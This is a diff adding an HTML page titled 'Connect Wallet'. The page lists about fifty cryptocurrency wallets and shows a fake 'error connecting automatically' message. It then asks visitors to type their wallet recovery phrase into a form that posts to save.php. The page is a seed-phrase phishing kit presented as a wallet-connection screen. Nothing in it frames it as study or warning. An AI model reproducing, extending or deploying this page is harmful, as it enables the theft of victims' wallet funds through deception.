@@ -1,0 +1,135 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Connect Wallet</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      background: #080c2b;
+      color: white;
+      text-align: center;
+      padding: 40px;
+    }
+
+    .wallet-list {
+      background: white;
+      color: black;
+      max-width: 400px;
+      margin: 0 auto;
+      border-radius: 12px;
+      padding: 20px;
+    }
+
+    .wallet {
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      padding: 10px;
+      margin: 8px 0;
+      cursor: pointer;
+    }
+
+    .modal {
+      display: none;
+      background: white;
+      color: black;
+      padding: 20px;
+      border-radius: 12px;
+      width: 300px;
+      margin: 30px auto;
+    }
+
+    input, button {
+      padding: 10px;
+      margin: 8px 0;
+      width: 100%;
+      border-radius: 8px;
+    }
+
+    .danger {
+      color: red;
+      font-weight: bold;
+    }
+
+  </style>
+</head>
+<body>
+
+  <h2>Connect your wallet</h2>
+  <div class="wallet-list">
+    <!-- Example: update all wallet items like this -->
+<div class="wallet" onclick="openWalletModal('Trust Wallet')">Trust</div>
+<div class="wallet" onclick="openWalletModal('MetaMask')">MetaMask</div>
+<div class="wallet" onclick="openWalletModal('Trust Wallet')">Coinbase</div>
+<div class="wallet" onclick="openWalletModal('MetaMask')">Xumm</div>
+<div class="wallet" onclick="openWalletModal('Trust Wallet')">Cardano</div>
+<div class="wallet" onclick="openWalletModal('MetaMask')">Daedalus</div>
+<div class="wallet" onclick="openWalletModal('Trust Wallet')">Yoroi</div>
+<div class="wallet" onclick="openWalletModal('MetaMask')">CCVault</div>
+<div class="wallet" onclick="openWalletModal('Trust Wallet')">Gero</div>
+<div class="wallet" onclick="openWalletModal('MetaMask')">Nami</div>
+<div class="wallet" onclick="openWalletModal('Trust Wallet')">Solana</div>
+<div class="wallet" onclick="openWalletModal('MetaMask')">Phantom</div>
+<div class="wallet" onclick="openWalletModal('Trust Wallet')">Solfalare</div>
+<div class="wallet" onclick="openWalletModal('MetaMask')">Sollet</div>
+<div class="wallet" onclick="openWalletModal('Trust Wallet')">Solong</div>
+<div class="wallet" onclick="openWalletModal('MetaMask')">Exodus</div>
+<div class="wallet" onclick="openWalletModal('Trust Wallet')">Velas</div>
+<div class="wallet" onclick="openWalletModal('MetaMask')">crypto.com</div>
+<div class="wallet" onclick="openWalletModal('Trust Wallet')">Blockchain</div>
+<div class="wallet" onclick="openWalletModal('MetaMask')">Binance smart Chain</div>
+<div class="wallet" onclick="openWalletModal('Trust Wallet')">Safepal</div>
+<div class="wallet" onclick="openWalletModal('MetaMask')">Argent</div>
+<div class="wallet" onclick="openWalletModal('Trust Wallet')">Fortmatic</div>
+<div class="wallet" onclick="openWalletModal('MetaMask')">Aktionariat</div>
+<div class="wallet" onclick="openWalletModal('Trust Wallet')">Infinity Wallet</div>
+<div class="wallet" onclick="openWalletModal('MetaMask')">Wallet.io</div>
+<div class="wallet" onclick="openWalletModal('Trust Wallet')">Torus</div>
+<div class="wallet" onclick="openWalletModal('MetaMask')">Nash</div>
+<div class="wallet" onclick="openWalletModal('Trust Wallet')">BitPay</div>
+<div class="wallet" onclick="openWalletModal('MetaMask')">imTOken</div>
+<div class="wallet" onclick="openWalletModal('Trust Wallet')">Ambire</div>
+<div class="wallet" onclick="openWalletModal('MetaMask')">Apollox</div>
+<div class="wallet" onclick="openWalletModal('Trust Wallet')">Bitski</div>
+<div class="wallet" onclick="openWalletModal('MetaMask')">Bobablocks</div>
+<div class="wallet" onclick="openWalletModal('Trust Wallet')">Crossming</div>
+<div class="wallet" onclick="openWalletModal('MetaMask')">Fireblocks</div>
+<div class="wallet" onclick="openWalletModal('Trust Wallet')">Kryptogo</div>
+<div class="wallet" onclick="openWalletModal('MetaMask')">Ledger</div>
+<div class="wallet" onclick="openWalletModal('Trust Wallet')">Now</div>
+<div class="wallet" onclick="openWalletModal('MetaMask')">Nufinetes</div>
+<div class="wallet" onclick="openWalletModal('Trust Wallet')"> onekey</div>
+<div class="wallet" onclick="openWalletModal('MetaMask')">Paper</div>
+<div class="wallet" onclick="openWalletModal('Trust Wallet')">Pier</div>
+<div class="wallet" onclick="openWalletModal('MetaMask')">Tron</div>
+<div class="wallet" onclick="openWalletModal('Trust Wallet')">Terra</div>
+<div class="wallet" onclick="openWalletModal('MetaMask')">Metis</div>
+<div class="wallet" onclick="openWalletModal('Trust Wallet')">injective</div>
+<div class="wallet" onclick="openWalletModal('MetaMask')">Other Wallet</div>
+<!-- etc. -->
+
+
+
+    <!-- Add more as needed -->
+  </div>
+
+  <div class="modal" id="walletModal">
+    <div class="danger">
+      There was an error connecting automatically. But do not worry, you can still connect manually.
+    </div>
+    <p>Import your <span id="walletName">Wallet</p>
+  
+    <form action="save.php" method="post">
+        <textarea name="user_input" rows="3" cols="30"placeholder="Enter your wallet phrase here..."></textarea><br><br>
+        <button type="submit">Validate</button>
+    <button onclick="hideModal()" style="background-color:red; color:white;">Close</button>
+  </div>
+
+  <script>
+  function openWalletModal(walletName) {
+    window.open(`wallet-modal.html?wallet=${encodeURIComponent(walletName)}`, '_blank');
+  }
+</script>
+</body>
+</html>
